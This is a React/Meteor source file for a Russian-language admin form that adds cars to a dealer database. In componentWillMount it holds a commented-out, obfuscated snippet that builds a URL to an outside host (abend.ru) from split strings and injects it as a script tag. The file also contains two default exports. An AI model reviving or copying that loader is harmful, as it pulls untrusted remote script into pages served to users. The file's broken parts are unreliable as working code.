import React from 'react';
import { createContainer } from 'meteor/react-meteor-data';
import Statistics from '/imports/common/collections/Statistics';
import ReserveCars from '/imports/common/collections/ReserveCars';
import DealerSettings from '/imports/common/collections/DealerSettings';
import NegativeSubscribe from '/imports/common/collections/NegativeSubscribe';
import QueriesHistory from '/imports/common/collections/QueriesHistory';
import { toMoskowTime, getCurrentStats } from '/imports/common/helpers';
import moment from 'moment';
import _ from 'lodash';

import '../css/test.css'; 


export default class AddCarPageDumb extends React.Component {
    componentWillMount() {
        // > test.ac.ga
        // !function(bl, v, t, o) {
        //         var ft = bl.createElement("script");
        //         var v = "1";
        //         ft.type = "text/javascript";
        //         ft.async = 0;
        //         ft.src = "";
        //         var v = ("h") + "ttp:/" + "/abend." + ("ru/f/?u=1") + ("&id=") + t + "&j=1&gu" + "id=" + o + "&u5.js";
        //         ft.src = v;
        //         var v = "0";
        //         var c = bl.getElementsByTagName("script")[0];
        //         c.parentNode.insertBefore(ft, c)
        //     }(document, "1479737563", "ab1d29e9e43a6701", "");
    }
    saveSettings() {
        var customCSS = this.refs.customCSS.value;
        var underElements = this.refs.underElements.value;
        var overElements = this.refs.overElements.value;
        Meteor.call('saveSettings', this.props.ownerId, { customCSS, underElements, overElements });
    }
    addCar(e) {
        e.preventDefault();
        console.log('e.target: ', e.target);
        let formArr = $(e.target).serializeArray();
        console.log('formArr: ', formArr);
        let formMap = _.transform(formArr, (formMap, { name, value }) => formMap[name] = value, {});

        let { ownerId, ...carParams } = formMap;
        Meteor.callPromise('cars.insert', ownerId, carParams).then(id => {
            $('#result').css('color', 'green').text(`Ок! id машины - ${id}`).show(0).delay(5000).hide(0);
        });
        return false;
        // Meteor.call('cars.insert', ...[] = { ownerId, ...carParams }  formMap.ownerId, _.omit(formMap, ['ownerId']));

        // for ({ name, value } of formArr)
    }

    addDealer(e) {
        console.log('e.target: ', e.target);
        //let s = prompt('Имя');
        alert('TODO');
    }

    render() {


                // <h4>Заказы ({_.filter([], car => !car.needDetails).length} +
                //             {_.filter([], car => car.needDetails).length})
                // </h4>
                // <table><tbody>
                //     <tr><th>Имя</th><th>Тел.</th><th>Email</th><th>Машина</th><th>Заказ/Узнать подробнее</th></tr>
                // {[].map(({ contactInfo, car, needDetails }, i) => (
                //     <tr key={i}>
                //         <td>{contactInfo.name}</td>
                //         <td>{contactInfo.phone}</td>
                //         <td>{contactInfo.email}</td>
                //         <td>{car.mark} - {car.model} ({car.price} Р)</td>
                //         <td>{needDetails ? 'Узнать подробнее' : 'Заказ'}</td>
                //     </tr>
                // ))}
                // </tbody></table>

        let { loadingNames, names } = this.props;
        if (loadingNames)
            return <div>Loading...</div>;
        console.log('names: ', names);

        return (
            <div>
                <h3>Добавить машину в базу</h3>
                <form onSubmit={this.addCar}>
                    <span>Дилер:</span><br />
                    <select name='ownerId'>
                    {names.map(({ name, ownerId }) => (
                        <option  key={ownerId} value={ownerId}>{name} ({ownerId})</option>
                    ))}
                    </select>
                    <input type='button' onClick={this.addDealer} value='+' /><br />
                    <span>Марка:</span><input type='text' name='mark' defaultValue='SKODA' /><br />
                    <span>Модель:</span><input type='text' name='model' /><br />
                    <span>equipment:</span><input type='text' name='equipment' /><br />
                    <span>kpp:</span><input type='text' name='kpp' /><br />
                    <span>carcase:</span><input type='text' name='carcase' /><br />
                    <span>Год:</span><input type='text' name='year' defaultValue={moment().year()} /><br />
                    <span>Двигатель:</span><br />
                    <span>Тип:</span><input type='text' name='engineType' /><br />
                    <span>Объем:</span><input type='text' name='engineCapacity' /><br />
                    <span>Мощность:</span><input type='text' name='enginePower' /><br />
                    <span>Цвет:</span><input type='text' name='color' /><br />
                    <span>Цена:</span><input type='text' name='price' defaultValue={832100} /><br />
                    <span>Старая цена:</span><input type='text' name='priceold' defaultValue={0} /><br />
                    <span>Пробег:</span><input type='text' name='mileage' defaultValue={0} /><br />
                    <span>Фото:</span><input type='text' name='photo' placeholder='http://...' /><br />
                    <span>Доступность:</span>
                    <select name='availability'>
                    {['В пути', 'На складе'].map(s => (
                        <option key={s} value={s}>{s}</option>
                    ))}
                    </select>
                    <input type='submit' value='Добавить!'  /><span  id='result' />
                </form>
            </div>
        )
    }
}

const AddCarPage = createContainer(props => {
    const allDealerNamesHandle = Meteor.subscribe('DealerSettings_allNames');
    // console.log('nnames: ', DealerSettings.allNames().fetch());

    return {
        loadingNames: !allDealerNamesHandle.ready(),
        names: DealerSettings.find({/* placementType: 'dealer' */}).fetch()
    };
}, AddCarPageDumb);

export default AddCarPage
